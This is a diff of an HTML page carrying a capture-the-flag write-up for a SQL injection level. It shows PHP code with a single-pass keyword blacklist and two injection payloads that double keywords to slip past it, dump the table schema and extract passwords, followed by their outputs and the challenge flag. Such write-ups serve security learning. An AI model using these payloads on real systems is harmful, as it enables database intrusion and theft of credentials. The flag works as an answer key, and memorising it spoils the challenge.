@@ -82,8 +82,8 @@
 <h3 id="initial-analysis">Initial analysis</h3>
 <p><code>class LevelTwo {     public function doQuery($injection) {         $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);         $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');         $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);         $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';         $getUsers = $pdo-&gt;query ($query);         $users = $getUsers-&gt;fetchArray (SQLITE3_ASSOC);         if ($users) {             return $users;         }         return false;     } }</code></p><br>
 <h3 id="walk-through">tl;dr</h3>
-<p>STEP 1: <code>0 UNIUNIONON SELSELECTECT 1,sql FROFROMM sqlite_master--</code> OUTPUT: Other User Details: id -&gt; 1 username -&gt; CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) (Columns)</p>
-<p>STEP 2: <code>0 UNIUNIONON SELSELECTECT 1, GROGROUPUP_CONCAT(password) FROFROMM users--</code> OUTPUT: Other User Details: id -&gt; 1 username -&gt; WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}</p>
+<p>STEP 1: <code>0 UNIUNIONON SELSELECTECT 1,sql FROFROMM sqlite_master--</code></p><p> OUTPUT: Other User Details: id -&gt; 1 username -&gt; CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) (Columns)</p>
+<p>STEP 2: <code>0 UNIUNIONON SELSELECTECT 1, GROGROUPUP_CONCAT(password) FROFROMM users--</code></p><p> OUTPUT: Other User Details: id -&gt; 1 username -&gt; WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}</p>
 <h3 id="flag">Flag</h3><br>
 <p><strong>FLAG</strong>: <code>WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}</code></p>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
